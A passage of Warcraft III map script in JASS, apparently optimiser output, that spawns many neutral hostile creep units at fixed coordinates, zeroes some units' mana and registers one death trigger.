set L7=CreateUnit(Ht,$7567686F,23612.2,368.7,91.03)
set Hc=null
set Hu=null
endfunction
function mm takes nothing returns nothing
local player Ht=Player(PLAYER_NEUTRAL_AGGRESSIVE)
local unit Hu
set Hu=CreateUnit(Ht,$6E667231,-9728.,576.,270.)
set Hu=CreateUnit(Ht,$6E666830,-4800.,-2112.,270.)
set Hu=CreateUnit(Ht,$6E667231,-9472.,-3072.,270.)
set Hu=CreateUnit(Ht,$6E686E73,-6720.,-12544.,270.)
set Hu=CreateUnit(Ht,$6E686E73,-6784.,-9152.,270.)
set Hu=CreateUnit(Ht,$6E646368,-3776.,-9088.,270.)
set Hu=CreateUnit(Ht,$757A6967,-11488.,4768.,270.)
set Hu=CreateUnit(Ht,$757A6967,-10400.,3296.,270.)
set Hu=CreateUnit(Ht,$757A6967,-6880.,3168.,270.)
set Hu=null
endfunction
function mn takes nothing returns nothing
local player Ht=Player(PLAYER_NEUTRAL_AGGRESSIVE)
local unit Hu
local trigger Hc
set Hu=CreateUnit(Ht,$6F737031,-7777.5,2330.4,243.06)
set Hu=CreateUnit(Ht,$6E303030,-6404.5,26.6,107.89)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303030,-8735.4,-1406.3,85.75)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303030,-7218.1,-3564.2,349.19)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303030,-9267.6,-3385.1,97.06)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$65666F6E,-14672.,-3404.3,225.22)
set Hu=CreateUnit(Ht,$65666F6E,-12378.8,-5045.8,225.22)
set Hu=CreateUnit(Ht,$6F737031,-7407.9,-3347.3,294.87)
set Hu=CreateUnit(Ht,$6F737031,-9126.8,-3244.2,294.87)
set Hu=CreateUnit(Ht,$6F737031,-6235.,-4386.1,263.39)
set Hu=CreateUnit(Ht,$6F737031,-6245.6,-3057.4,152.53)
set Hu=CreateUnit(Ht,$6F737031,-5906.3,-2061.7,347.62)
set Hu=CreateUnit(Ht,$6F737031,-7153.3,-1266.1,243.06)
set Hu=CreateUnit(Ht,$6F737031,-8954.9,-1349.,172.91)
set Hu=CreateUnit(Ht,$6F737031,-9672.5,138.,222.15)
set Hu=CreateUnit(Ht,$65666F6E,-7587.2,2234.1,323.26)
set Hu=CreateUnit(Ht,$6E303030,-7498.9,-828.7,349.19)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$65666F6E,-7571.1,797.1,323.26)
set Hu=CreateUnit(Ht,$65666F6E,-9490.9,484.3,353.74)
set Hu=CreateUnit(Ht,$65666F6E,-7017.9,-1374.5,147.4)
set Hu=CreateUnit(Ht,$65666F6E,-5647.5,-430.2,113.12)
set Hu=CreateUnit(Ht,$65666F6E,-5746.7,-2050.2,25.49)
set Hu=CreateUnit(Ht,$65666F6E,-6147.3,-4513.8,80.24)
set Hu=CreateUnit(Ht,$65666F6E,-7431.6,-5062.2,77.34)
set Hu=CreateUnit(Ht,$65666F6E,-9150.6,-3550.2,23.45)
set Hu=CreateUnit(Ht,$65666F6E,-11415.1,-3507.9,165.14)
set Hu=CreateUnit(Ht,$65666F6E,-14676.4,-3974.5,225.22)
set Hu=CreateUnit(Ht,$65666F6E,-12957.4,-5998.,294.03)
set Hu=CreateUnit(Ht,$65666F6E,-12737.9,-6902.8,101.06)
set Hu=CreateUnit(Ht,$65666F6E,-10672.,-6021.9,173.61)
set Hu=CreateUnit(Ht,$6E646572,-8593.3,142.1,284.98)
set Hu=CreateUnit(Ht,$6E656372,-6006.,-3857.,95.28)
set Hu=CreateUnit(Ht,$6E726163,-13251.9,-5743.7,313.42)
set Hu=CreateUnit(Ht,$6E726163,-14491.3,-3575.6,266.71)
set Hu=CreateUnit(Ht,$6E726163,-10020.8,1744.,185.29)
set Hu=CreateUnit(Ht,$6F737031,-5684.3,-1111.3,243.06)
set Hu=CreateUnit(Ht,$6F737733,-12736.5,-5918.6,112.16)
set Hu=CreateUnit(Ht,$6F737733,-14518.5,-3834.3,112.16)
set Hu=CreateUnit(Ht,$6F737733,-14764.5,-3476.8,112.16)
set Hu=CreateUnit(Ht,$6F737733,-10794.2,-6287.2,112.16)
set Hu=CreateUnit(Ht,$6F737733,-12428.9,-6761.1,112.16)
set Hu=CreateUnit(Ht,$6F737733,-12215.9,-4990.2,112.16)
set Hu=CreateUnit(Ht,$6F737031,-14103.6,-7975.1,172.91)
set Hu=CreateUnit(Ht,$6F737733,-15736.6,-7226.5,24.93)
set Hu=CreateUnit(Ht,$6F737733,-13376.4,-8487.3,112.16)
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,Hu,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(Hc,Hu,EVENT_UNIT_CHANGE_OWNER)
call TriggerAddAction(Hc,function mE)
set Hu=CreateUnit(Ht,$6F737031,-15624.1,-5631.4,172.91)
set Hu=CreateUnit(Ht,$6F737031,-14555.4,-6203.4,172.91)
set Hu=CreateUnit(Ht,$6E73626D,-14287.7,-10794.7,232.38)
set Hu=CreateUnit(Ht,$6E677277,-8511.8,-6832.9,176.17)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303044,-10319.1,-8478.4,37.12)
set Hu=CreateUnit(Ht,$6E303044,-10456.,-11323.4,37.12)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303044,-10268.4,-14540.5,37.12)
call SetUnitState(Hu,UNIT_STATE_MANA,100)
set Hu=CreateUnit(Ht,$6E303044,-7642.1,-13261.6,37.12)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303044,-4067.,-10030.8,37.12)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303045,-8912.1,-8819.4,311.48)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303045,-8899.2,-11400.5,311.48)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303045,-11312.5,-14504.5,311.48)
set Hu=CreateUnit(Ht,$6E303045,-4799.5,-11496.2,311.48)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303046,-5895.,-14194.3,180.43)
set Hu=CreateUnit(Ht,$6E303046,-5070.9,-11479.5,180.43)
set Hu=CreateUnit(Ht,$6E303046,-4140.9,-9305.3,180.43)
set Hu=CreateUnit(Ht,$6E303046,-6694.5,-11133.6,180.43)
set Hu=CreateUnit(Ht,$6E303046,-10389.6,-9799.6,180.43)
set Hu=CreateUnit(Ht,$6E303046,-11466.9,-13543.6,180.43)
set Hu=CreateUnit(Ht,$6E303046,-7663.1,-13644.8,180.43)
set Hu=CreateUnit(Ht,$6E303046,-7122.6,-9284.6,180.43)
set Hu=CreateUnit(Ht,$6E73626D,-6738.7,-9469.7,232.38)
set Hu=CreateUnit(Ht,$6E303343,3129.5,5491.5,77.181)
set Hu=CreateUnit(Ht,$6E677277,-7601.6,-7255.,176.17)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E627A6B,-490.7,-5501.2,233.31)
set Hu=CreateUnit(Ht,$6E677277,-6204.4,-7641.6,176.17)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E726472,-1592.,1518.6,204.062)
set Hu=CreateUnit(Ht,$6E61646B,-2064.5,-5763.8,251.89)
set Hu=CreateUnit(Ht,$6E61646B,-2989.2,-3996.7,251.89)
set Hu=CreateUnit(Ht,$6E73626D,-12163.2,-11246.5,232.38)
set Hu=CreateUnit(Ht,$6E73626D,-10606.6,-13480.3,232.38)
set Hu=CreateUnit(Ht,$6E73626D,-8721.4,-14623.,232.38)
set Hu=CreateUnit(Ht,$6E73626D,-8831.6,-10260.2,232.38)
set Hu=CreateUnit(Ht,$6E73626D,-5544.5,-13986.4,232.38)
set Hu=CreateUnit(Ht,$6E303046,-6101.,-12709.5,180.43)
set Hu=CreateUnit(Ht,$6E303045,-11883.6,-10939.6,311.48)
set Hu=CreateUnit(Ht,$6E303044,-11486.9,-9300.2,37.12)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E677277,-5112.9,-7352.2,176.17)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E677277,-4917.5,-6524.8,176.17)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E677277,-4867.2,-4671.3,176.17)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E677277,-4084.2,-7714.1,176.17)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E61646B,-3504.8,-5553.,251.89)
set Hu=CreateUnit(Ht,$6E61646B,-1834.4,-4437.9,169.916)
set Hu=CreateUnit(Ht,$6E61646B,-2064.5,-5763.8,251.89)
set Hu=CreateUnit(Ht,$6E61646B,-2721.1,-7306.6,251.89)
set Hu=CreateUnit(Ht,$6E61646B,-2669.7,-8339.6,251.89)
set Hu=CreateUnit(Ht,$6E61646B,-1421.5,-7621.,251.89)
set Hu=CreateUnit(Ht,$6E61646B,-897.8,-7710.6,251.89)
set Hu=CreateUnit(Ht,$6E61646B,-583.1,-8814.9,251.89)
set Hu=CreateUnit(Ht,$6E61646B,-473.,-9407.6,251.89)
set Hu=CreateUnit(Ht,$6E627A6B,-6.,-6679.9,233.31)
set Hu=CreateUnit(Ht,$6E627A6B,1123.4,-8409.4,233.31)
set Hu=CreateUnit(Ht,$6E627A6B,1393.3,-8803.1,233.31)
set Hu=CreateUnit(Ht,$6E627A6B,1905.6,-7218.8,233.31)
set Hu=CreateUnit(Ht,$6E627A6B,2265.6,-7107.,233.31)
set IN=CreateUnit(Ht,$68303448,6119.1,-9988.6,0.)
set IO=CreateUnit(Ht,$68303448,6606.1,-11325.8,90.)
set Hu=CreateUnit(Ht,$6E627A6B,1132.3,-6663.6,233.31)
set Hu=CreateUnit(Ht,$6E303047,3368.3,-2876.8,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E677277,-4517.9,-6472.2,176.17)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,3113.5,-2961.,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,3685.2,-1512.3,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,2244.,-1519.5,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,1562.8,-3377.5,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,-16.5,-3499.6,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,335.2,-1644.4,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,605.9,-1670.,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,359.6,-219.3,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E61646B,-3338.8,-4048.1,251.89)
set Hu=CreateUnit(Ht,$6E61646B,-2014.7,-8815.8,251.89)
set Hu=CreateUnit(Ht,$6E303047,-575.,865.3,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E726472,-2234.1,-2741.,34.28)
set Hu=CreateUnit(Ht,$6E303047,1151.7,1569.5,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,1016.,1190.5,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,1820.2,-34.3,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,2238.7,224.6,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E726472,-3323.2,340.,34.28)
set Hu=CreateUnit(Ht,$6E726472,-3910.4,-1207.9,350.578)
set Hu=CreateUnit(Ht,$6E726472,-1504.7,-3108.6,278.335)
set Hu=CreateUnit(Ht,$6F737031,-4657.,-2295.2,152.53)
set Hu=CreateUnit(Ht,$6E747267,-3016.6,2335.3,177.18)
set Hu=CreateUnit(Ht,$75303033,-9023.2,4336.1,181.39)
set Hu=CreateUnit(Ht,$6E726472,-701.5,-2586.,237.521)
set Hu=CreateUnit(Ht,$6E726472,-3289.6,-2524.6,93.619)
set Hu=CreateUnit(Ht,$6E30324D,8545.9,-3270.8,334.9)
set Hu=CreateUnit(Ht,$6E30324D,10097.3,-4865.,334.9)
set Hu=CreateUnit(Ht,$6E30324D,8190.3,-5750.9,334.9)
set Hu=CreateUnit(Ht,$6E726472,-2433.5,-1942.5,133.136)
set Hu=CreateUnit(Ht,$6E30324D,10694.1,-6274.9,88.43)
set Hu=CreateUnit(Ht,$6E30324D,6346.4,-3643.3,334.9)
set Hu=CreateUnit(Ht,$6E30324A,10275.7,-2551.6,101.96)
set Hu=CreateUnit(Ht,$6E30324A,9049.3,-2480.9,101.96)
set Hu=CreateUnit(Ht,$6E30324A,9405.5,-3864.3,101.96)
set Hu=CreateUnit(Ht,$6E726472,-2149.1,-41.,263.281)
set Hu=CreateUnit(Ht,$6E30324A,10903.4,-3904.6,101.96)
set Hu=CreateUnit(Ht,$6E30324A,10667.8,-4136.6,101.96)
set Hu=CreateUnit(Ht,$6E726472,-1511.9,-38.9,171.774)
set Hu=CreateUnit(Ht,$6E30324A,10199.2,-6195.7,101.96)
set Hu=CreateUnit(Ht,$6E747267,-4779.8,2321.2,177.18)
set Hu=CreateUnit(Ht,$6E676772,-3657.5,3244.8,203.77)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E6A6762,-4730.1,1303.1,227.67)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E737277,-4545.1,1291.2,296.18)
set Hu=CreateUnit(Ht,$6E737277,-3402.2,4901.4,296.18)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E737277,-879.3,6362.5,296.18)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E737277,-580.4,4320.5,296.18)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E6A6762,-3192.4,4736.7,227.67)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E6A6762,-1985.6,5180.8,227.67)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E6A6762,300.,5821.,227.67)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E6A6762,-818.1,4037.2,227.67)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E747267,-3560.6,6459.9,177.18)
set Hu=CreateUnit(Ht,$6E747267,-1207.3,6479.,177.18)
set Hu=CreateUnit(Ht,$6E747267,-1469.9,4941.5,177.18)
set Hu=CreateUnit(Ht,$6E676772,-3210.,6431.5,203.77)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E676772,503.1,5603.4,203.77)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E747267,-1410.9,2702.,177.18)
set Hu=CreateUnit(Ht,$6E6A6762,-1215.3,2742.5,227.67)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E737277,-2184.6,3657.3,296.18)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30305A,-8859.4,5667.5,263.658)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$75303032,-7746.6,3343.4,80.06)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$75303032,-12663.8,7523.2,80.06)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$75303032,-10559.8,5722.7,80.06)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$75303032,-6902.5,5612.7,80.06)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$75303032,-5588.7,7918.,80.06)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$75303032,-9688.5,7946.5,80.06)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303059,-7786.8,4374.8,97.59)
set Hu=CreateUnit(Ht,$6E30305A,-9959.4,3125.4,263.658)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303059,-11696.1,5515.2,97.59)
set Hu=CreateUnit(Ht,$6E303059,-8298.7,7950.1,97.59)
set Hu=CreateUnit(Ht,$6E303058,-6304.5,4448.1,46.21)
set Hu=CreateUnit(Ht,$6E303058,-10733.3,6717.2,46.21)
set Hu=CreateUnit(Ht,$6E303058,-12656.5,5542.8,46.21)
set Hu=CreateUnit(Ht,$6E303058,-8143.7,7868.8,46.21)
set Hu=CreateUnit(Ht,$6E303058,-9178.2,6459.8,46.21)
set Hu=CreateUnit(Ht,$6E303058,-5082.3,5672.8,46.21)
set Hu=CreateUnit(Ht,$75303033,-10985.8,6562.7,181.39)
set Hu=CreateUnit(Ht,$75303033,-12906.5,5948.6,181.39)
set Hu=CreateUnit(Ht,$75303033,-9637.9,8051.7,181.39)
set Hu=CreateUnit(Ht,$75303033,-8821.7,6676.9,181.39)
set Hu=CreateUnit(Ht,$75303033,-6802.7,6661.2,181.39)
set Hu=CreateUnit(Ht,$75303033,-5327.,7530.2,181.39)
set Hu=CreateUnit(Ht,$6E30305A,-7304.3,5571.4,263.658)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30305A,-5429.5,5959.3,263.658)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30305A,-11415.,7300.2,263.658)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30305A,-12770.8,6966.2,263.658)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30305A,-6686.3,7673.5,263.658)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30305A,-8939.5,4064.4,263.658)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303248,8310.9,5216.9,274.788)
set Hu=CreateUnit(Ht,$6F737733,-15294.9,-7334.5,64.64)
set Hu=CreateUnit(Ht,$6E303158,-4003.,10938.7,277.446)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303157,-8317.9,11070.8,31.938)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303155,-5396.6,10617.6,5.208)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30315A,-5540.7,10596.1,130.489)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303155,-7714.,11837.4,5.208)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303155,-9163.7,15304.7,5.208)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303155,-6439.4,12848.9,5.208)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303155,523.4,10360.1,5.208)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303155,-485.9,13508.6,5.208)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303155,2005.5,13290.,5.208)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30315A,-5259.6,10627.9,130.489)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30315A,-7484.8,11880.,130.489)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E73626D,-13720.,-12207.7,50.065)
set Hu=CreateUnit(Ht,$6E30315A,-12384.,12574.5,130.489)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30315A,-9173.7,15140.1,130.489)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30315A,-9043.8,15422.7,130.489)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30315A,-6527.3,13199.,130.489)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E726472,-1912.1,-731.7,194.871)
set Hu=CreateUnit(Ht,$6E30315A,328.9,8938.3,130.489)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30315A,-2593.9,9966.4,130.489)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303156,-8850.4,9955.8,326.48)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303156,-11395.,10777.5,326.48)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303156,-8923.3,14441.4,326.48)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303159,-6550.6,11271.2,188.015)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303045,-13850.7,-10691.6,311.48)
set Hu=CreateUnit(Ht,$6E303156,-360.1,9577.1,326.48)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303156,509.3,8894.7,326.48)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303156,2163.6,10403.9,326.48)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303159,-8175.7,10247.2,188.015)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303159,-10595.7,9709.9,188.015)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303159,-12200.2,11245.7,188.015)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303159,-7939.3,15435.,188.015)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303159,-1442.1,13691.9,188.015)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303159,-1404.5,13474.6,188.015)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303159,-1835.2,10222.1,188.015)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303159,-229.3,11398.,188.015)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303159,2252.9,10176.5,188.015)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303157,-11149.8,10563.1,31.938)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303158,-3181.3,13126.4,277.446)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303157,-1235.7,10090.5,31.938)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303157,729.,10467.5,31.938)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303157,1543.2,9363.9,31.938)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303157,65.2,14385.3,31.938)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303157,2182.3,13369.6,31.938)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303045,-14099.1,-12002.,69.056)
set Hu=CreateUnit(Ht,$6E303158,1755.1,9201.6,277.446)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303158,1884.6,15505.3,277.446)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303158,2045.6,15546.1,277.446)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303158,2204.8,15579.8,277.446)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303155,1261.1,13950.7,5.208)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303159,2200.3,14612.,188.015)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303155,-4202.1,10999.6,5.208)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303156,-2804.1,11497.8,326.48)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303158,-3025.4,13135.7,277.446)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303159,-5484.7,12001.3,188.015)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303159,-5524.6,11875.4,188.015)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303158,-2665.5,11745.2,277.446)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30324A,7137.7,-6015.8,101.96)
set Hu=CreateUnit(Ht,$6E30324A,7177.7,-6219.6,101.96)
set Hu=CreateUnit(Ht,$6E30324A,5985.9,-5747.6,101.96)
set Hu=CreateUnit(Ht,$6E30324A,5097.1,-3708.,101.96)
set Hu=CreateUnit(Ht,$6E30324A,6869.5,-4456.6,101.96)
set Hu=CreateUnit(Ht,$6E30324A,6872.3,-3708.5,101.96)
set Hu=CreateUnit(Ht,$6E30324A,8023.9,-3926.1,101.96)
set Hu=CreateUnit(Ht,$6E30324A,8834.3,-4598.4,101.96)
set Hu=CreateUnit(Ht,$6E30324B,8836.4,858.3,22.304)
set Hu=CreateUnit(Ht,$6E303248,11869.9,1060.1,274.79)
set Hu=CreateUnit(Ht,$6E30324C,13474.4,489.,270.55)
set Hu=CreateUnit(Ht,$6E30324D,8741.2,-1590.8,334.9)
set Hu=CreateUnit(Ht,$6E30324B,10370.9,2686.4,273.41)
set Hu=CreateUnit(Ht,$6E30324B,12570.4,761.2,273.41)
set Hu=CreateUnit(Ht,$6E303248,10594.2,5426.5,274.788)
set Hu=CreateUnit(Ht,$6E30324B,7664.1,4143.5,273.41)
set Hu=CreateUnit(Ht,$6E303248,12370.6,5088.,274.788)
set Hu=CreateUnit(Ht,$6E303248,12151.,4896.2,274.788)
set Hu=CreateUnit(Ht,$6E303248,12171.2,3602.8,274.788)
set Hu=CreateUnit(Ht,$6E303248,13599.1,2360.2,274.788)
set Hu=CreateUnit(Ht,$6E303248,12289.,2003.,274.788)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303248,11375.6,2858.7,274.788)
set Hu=CreateUnit(Ht,$6E303248,10278.6,3717.4,274.788)
set Hu=CreateUnit(Ht,$6E303248,9384.1,2435.5,274.788)
set Hu=CreateUnit(Ht,$6E303248,9393.2,884.8,274.788)
set Hu=CreateUnit(Ht,$6E303248,10753.8,1759.,274.788)
set Hu=CreateUnit(Ht,$6E303248,8749.,4235.8,274.788)
set Hu=CreateUnit(Ht,$6E303248,7475.5,3317.5,274.788)
set Hu=CreateUnit(Ht,$6E303248,7669.7,2810.4,274.788)
set Hu=CreateUnit(Ht,$6E30324C,12786.3,-2218.4,318.814)
set Hu=CreateUnit(Ht,$6E30324C,15418.2,-690.5,246.853)
set Hu=CreateUnit(Ht,$6E30324C,14197.8,-3294.3,314.847)
set Hu=CreateUnit(Ht,$6E30324C,14513.9,-2392.5,52.5)
set Hu=CreateUnit(Ht,$6E30324C,12628.4,-4603.3,54.953)
set Hu=CreateUnit(Ht,$6E303249,14984.2,906.9,175.52)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303249,14214.1,188.2,175.52)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303249,15841.7,.8,175.52)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set IP=CreateUnit(Ht,$68303448,5264.8,-9253.8,0.)
set Hu=CreateUnit(Ht,$6E303249,16246.8,-1327.7,175.52)
